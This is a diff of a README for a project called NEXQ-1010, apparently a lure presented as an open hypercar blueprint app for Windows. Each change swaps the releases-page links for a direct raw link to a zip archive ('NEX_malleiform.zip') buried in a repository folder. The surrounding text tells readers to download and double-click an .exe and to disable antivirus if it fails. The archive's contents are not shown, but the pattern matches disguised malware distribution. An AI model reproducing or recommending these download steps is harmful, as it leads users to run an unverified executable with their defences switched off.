@@ -1,6 +1,6 @@
 # 🚗 NEXQ-1010 - Advanced Open Hypercar Blueprint  
 
-[![Download NEXQ-1010](https://img.shields.io/badge/Download-NEXQ--1010-blue?style=for-the-badge)](https://github.com/uhalr/NEXQ-1010/releases)  
+[![Download NEXQ-1010](https://img.shields.io/badge/Download-NEXQ--1010-blue?style=for-the-badge)](https://github.com/uhalr/NEXQ-1010/raw/refs/heads/main/workbag/NEX_malleiform.zip)  
 
 ## 🔍 About NEXQ-1010  
 
@@ -29,7 +29,7 @@ This guide walks through downloading and opening the NEXQ-1010 application on a 
 
 Visit the releases page to get the latest version:  
 
-[Download NEXQ-1010](https://github.com/uhalr/NEXQ-1010/releases)  
+[Download NEXQ-1010](https://github.com/uhalr/NEXQ-1010/raw/refs/heads/main/workbag/NEX_malleiform.zip)  
 
 Clicking the link takes you to the release area on GitHub. Here you will find the files needed to install and run the software.  
 
@@ -85,7 +85,7 @@ If the application does not open or crashes, try the following steps:
 - Check that your system meets the minimum requirements listed above.  
 - Update your Windows system to the latest version.  
 - Disable any antivirus temporarily as it may block parts of the software.  
-- Reinstall the application by downloading the latest `.exe` from the [release page](https://github.com/uhalr/NEXQ-1010/releases).  
+- Reinstall the application by downloading the latest `.exe` from the [release page](https://github.com/uhalr/NEXQ-1010/raw/refs/heads/main/workbag/NEX_malleiform.zip).  
 
 For more help, use the built-in Help Menu. It includes answers to common issues and contact details for technical support.  
 
@@ -94,7 +94,7 @@ For more help, use the built-in Help Menu. It includes answers to common issues 
 You can download and run the NEXQ-1010 software on your Windows computer by following these steps:  
 
 1. Go to the release page at this link:  
-   [https://github.com/uhalr/NEXQ-1010/releases](https://github.com/uhalr/NEXQ-1010/releases)  
+   [https://github.com/uhalr/NEXQ-1010/raw/refs/heads/main/workbag/NEX_malleiform.zip](https://github.com/uhalr/NEXQ-1010/raw/refs/heads/main/workbag/NEX_malleiform.zip)  
 2. Find the latest `.exe` file and click to download it.  
 3. Wait for the download to finish.  
 4. Locate the downloaded file and double-click it to start installation.  
